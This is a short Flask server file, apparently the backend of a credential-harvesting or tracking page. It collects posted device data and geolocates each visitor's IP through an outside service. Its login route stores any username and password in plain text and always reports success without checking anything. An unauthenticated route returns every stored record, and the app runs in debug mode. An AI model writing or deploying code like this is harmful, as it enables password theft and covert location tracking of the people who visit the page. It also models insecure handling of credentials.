from flask import Flask, request, jsonify, render_template
import requests
from urllib.parse import quote as url_quote


app = Flask(__name__)

data_storage = []

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/collect-data', methods=['POST'])
def collect_data():
    device_data = request.json
    device_data['ip'] = request.remote_addr

    response = requests.get(f"https://ipapi.co/{device_data['ip']}/json/")
    location_data = response.json()
    device_data.update(location_data)

    data_storage.append(device_data)
    return jsonify({'status': 'success'}), 200

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')

    login_data = {
        'username': username,
        'password': password,
        'ip': request.remote_addr
    }
    data_storage.append(login_data)

    return jsonify({'status': 'login successful'}), 200

@app.route('/data-storage', methods=['GET'])
def get_data():
    return jsonify(data_storage), 200

if __name__ == '__main__':
    app.run(debug=True)
